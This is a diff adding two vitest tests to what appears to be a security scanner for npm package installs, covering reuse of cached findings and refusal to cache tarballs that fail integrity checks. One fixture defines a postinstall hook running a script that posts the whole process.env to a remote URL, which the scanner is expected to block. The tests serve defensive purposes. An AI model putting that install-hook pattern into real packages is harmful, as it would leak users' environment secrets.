@@ -1,5 +1,6 @@
 import { createHash } from "node:crypto";
 import { describe, expect, it } from "vitest";
+import type { Finding } from "../verdict.ts";
 import { planInstall, planInstallOnline } from "./scan.ts";
 import { tar } from "./test-tar.ts";
 
@@ -341,6 +342,63 @@ describe("planInstallOnline: package contents", () => {
         message: expect.stringContaining("darwin-arm64"),
       }),
     ]);
+  });
+
+  it("reuses cached content findings instead of downloading again", async () => {
+    const tgz = tarball({
+      "package.json": JSON.stringify({
+        name: "p",
+        scripts: { postinstall: "node s.js" },
+      }),
+      "s.js": "fetch(u, { body: JSON.stringify(process.env) });",
+    });
+    const stored = new Map<string, Finding[]>();
+    const cache = {
+      get: (integrity: string) => stored.get(integrity),
+      set: (
+        integrity: string,
+        _label: string,
+        findings: readonly Finding[],
+      ) => {
+        stored.set(integrity, [...findings]);
+      },
+    };
+    const downloads = { count: 0 };
+    const counting: typeof fetch = async (input, init) => {
+      if (String(input).endsWith(".tgz")) downloads.count += 1;
+      return serve(tgz)(input, init);
+    };
+    const first = await planInstallOnline(undefined, planWith(sri(tgz)), {
+      fetch: counting,
+      now,
+      cache,
+    });
+    const second = await planInstallOnline(undefined, planWith(sri(tgz)), {
+      fetch: counting,
+      now,
+      cache,
+    });
+    expect(downloads.count).toBe(1);
+    expect(second).toMatchObject({ status: "complete", verdict: "block" });
+    expect(second.status === "complete" && second.findings).toEqual(
+      first.status === "complete" && first.findings,
+    );
+  });
+
+  it("never caches a tarball that failed its integrity check", async () => {
+    const tgz = tarball({ "package.json": "{}" });
+    const stored = new Map<string, Finding[]>();
+    const cache = {
+      get: () => undefined,
+      set: (i: string, _l: string, f: readonly Finding[]) =>
+        void stored.set(i, [...f]),
+    };
+    await planInstallOnline(undefined, planWith(sri(Buffer.from("other"))), {
+      fetch: serve(tgz),
+      now,
+      cache,
+    });
+    expect(stored.size).toBe(0);
   });
 
   it("is incomplete when the plan exceeds the download budget", async () => {
